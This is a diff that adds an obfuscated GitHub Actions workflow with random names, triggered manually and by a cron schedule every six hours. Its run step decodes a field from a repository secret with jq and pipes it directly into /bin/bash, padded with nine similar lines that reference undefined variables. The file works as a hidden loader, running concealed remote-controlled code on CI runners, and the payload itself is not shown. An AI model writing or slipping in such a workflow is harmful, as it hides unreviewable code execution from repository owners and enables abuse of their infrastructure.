@@ -1,0 +1,26 @@
+name: wanf2xy
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '49 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: wanf2xy
+        env:
+          lwcn43389: ${{ secrets.lwcn43389 }}
+        run: |
+          echo $lwcn43389 | jq -r .t1046 | /bin/bash
+          echo $bldvl00650 | jq -r .mhkfz94 | /bin/bash
+          echo $vzowx8486 | jq -r .dxptt99892 | /bin/bash
+          echo $zwyx28 | jq -r .qfcwl134 | /bin/bash
+          echo $dso6 | jq -r .hzm91 | /bin/bash
+          echo $hcezb3205 | jq -r .vhbcx89 | /bin/bash
+          echo $hu9 | jq -r .beel6 | /bin/bash
+          echo $wk1 | jq -r .n9 | /bin/bash
+          echo $o48 | jq -r .slw2592 | /bin/bash
+          echo $j186 | jq -r .mw54 | /bin/bash
+
